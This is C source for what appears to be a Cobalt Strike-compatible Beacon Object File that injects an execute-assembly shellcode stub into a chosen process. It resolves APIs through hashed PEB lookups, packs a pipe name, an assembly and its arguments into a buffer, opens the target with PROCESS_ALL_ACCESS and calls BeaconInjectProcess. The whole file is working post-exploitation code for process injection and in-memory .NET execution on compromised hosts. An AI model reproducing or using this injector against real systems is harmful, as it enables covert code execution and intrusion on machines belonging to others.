#include "common.h"

D_SEC( A ) VOID WINAPI BofMain( _In_ PBAPI_TABLE BeaconApi, _In_ PVOID Argv, _In_ INT Argc ) 
{
    API         Api;
    DATAP       Psr;
    HANDLE      hPrc = NULL;
    PVOID       Data = NULL;

    PVOID       Ntd = NULL;
    PVOID       K32 = NULL;

    PCHAR       PidStr;
    INT         PidSiz = 0;
    INT         Pid = 0;

    PCHAR       PipStr = NULL;
    PCHAR       LenStr = NULL;
    PCHAR       AsmStr = NULL;
    PCHAR       ArgStr = NULL;
    INT         PipSiz = 0;
    INT         LenSiz = 0;
    INT         AsmSiz = 0;
    INT         ArgSiz = 0;


    RtlSecureZeroMemory( &Api, sizeof( Api ) );
    RtlSecureZeroMemory( &Psr, sizeof( Psr ) );

    Ntd = PebGetModule( H_LIB_NTDLL );
    K32 = PebGetModule( H_LIB_KERNEL32 );

    BeaconApi->BeaconDataParse( &Psr, Argv, Argc );
    Api.RtlAllocateHeap = PeGetFuncEat( Ntd, H_API_RTLALLOCATEHEAP );
    Api.NtClose         = PeGetFuncEat( Ntd, H_API_NTCLOSE );
    Api.OpenProcess     = PeGetFuncEat( K32, H_API_OPENPROCESS );

    PidStr = BeaconApi->BeaconDataExtract( &Psr, &PidSiz );
    Pid = custatoi( PidStr );

    PipStr = BeaconApi->BeaconDataExtract( &Psr, &PipSiz );
    LenStr = BeaconApi->BeaconDataExtract( &Psr, &LenSiz );
    AsmStr = BeaconApi->BeaconDataExtract( &Psr, &AsmSiz );
    ArgStr = BeaconApi->BeaconDataExtract( &Psr, &ArgSiz );


    Data = Api.RtlAllocateHeap( NtCurrentTeb()->ProcessEnvironmentBlock->ProcessHeap,
                                HEAP_ZERO_MEMORY,
                                sizeof( PipSiz ) + 1 + PipSiz +
                                sizeof( LenSiz ) + 1 + LenSiz +
                                sizeof( AsmSiz ) + 1 + AsmSiz +
                                sizeof( ArgSiz ) + 1 + ArgSiz
                                );

    if ( Data == NULL )
    {
        BeaconApi->BeaconPrintf( CALLBACK_OUTPUT, L"[-] Unknown exception" );
        return;
    };

    cpymem( Data,
            &PipSiz,
            sizeof( PipSiz ) + 1
            );
    cpymem( Data + sizeof( PipSiz ) + 1,
            PipStr,
            PipSiz
            );
    cpymem( Data + sizeof( PipSiz ) + 1 + PipSiz,
            &LenSiz,
            sizeof( LenSiz ) + 1
            );
    cpymem( Data + sizeof( PipSiz ) + 1 + PipSiz + sizeof( LenSiz ) + 1,
            LenStr,
            LenSiz
            );
    cpymem( Data + sizeof( PipSiz ) + 1 + PipSiz + sizeof( LenSiz ) + 1 + LenSiz,
            &AsmSiz,
            sizeof( AsmSiz ) + 1
            );
    cpymem( Data + sizeof( PipSiz ) + 1 + PipSiz + sizeof( LenSiz ) + 1 + LenSiz + sizeof( AsmSiz ) + 1,
            AsmStr,
            AsmSiz
            );

    cpymem( Data + sizeof( PipSiz ) + 1 + PipSiz + sizeof( LenSiz ) + 1 + LenSiz + sizeof( AsmSiz ) + 1 + AsmSiz,
            &ArgSiz,
            sizeof( ArgSiz ) + 1
            );
    cpymem( Data + sizeof( PipSiz ) + 1 + PipSiz + sizeof( LenSiz ) + 1 + LenSiz + sizeof( AsmSiz ) + 1 + AsmSiz + sizeof( ArgSiz ) + 1,
            ArgStr,
            ArgSiz
            );

    if ( ( hPrc = Api.OpenProcess( PROCESS_ALL_ACCESS, FALSE, Pid ) ) != NULL )
    {
        BeaconApi->BeaconInjectProcess( hPrc, 
                                        Pid, 
                                        C_PTR( G_PTR( ExecuteAssembly ) ),
                                        U_PTR( U_PTR( G_END( ) ) - U_PTR( G_PTR( ExecuteAssembly ) ) ),
                                        0,
                                        Data,
                                        sizeof( PipSiz ) + 1 + PipSiz +
                                        sizeof( LenSiz ) + 1 + LenSiz +
                                        sizeof( AsmSiz ) + 1 + AsmSiz +
                                        sizeof( ArgSiz ) + 1 + ArgSiz
                                        );
        Api.NtClose( hPrc );
    }
    else
    {
        BeaconApi->BeaconPrintf( CALLBACK_OUTPUT, C_PTR( G_PTR( L"[-] Unable to open process" ) ) );
        return;
    };
};
